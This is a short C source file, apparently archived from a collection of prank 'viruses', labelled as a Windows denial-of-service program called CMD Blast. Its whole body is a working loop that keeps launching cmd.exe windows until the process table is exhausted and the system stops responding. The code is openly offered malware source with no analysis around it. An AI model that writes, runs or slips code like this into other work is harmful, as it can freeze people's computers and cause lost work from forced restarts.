/*
  name      CMD Blast
  type      prank/dos
  cve       —
  year      —
  os        windows
  authors   Minhas Kamal
  source    https://github.com/MinhasKamal/CuteVirusCollection
  archived  krisyotam
  notes     opens cmd.exe windows until process table exhausted
 */

// Opens CMD windows in an infinite loop until the system gives up. Windows only.
#include <stdlib.h>

main(){
    while(1){
        system("start cmd");
    }
}
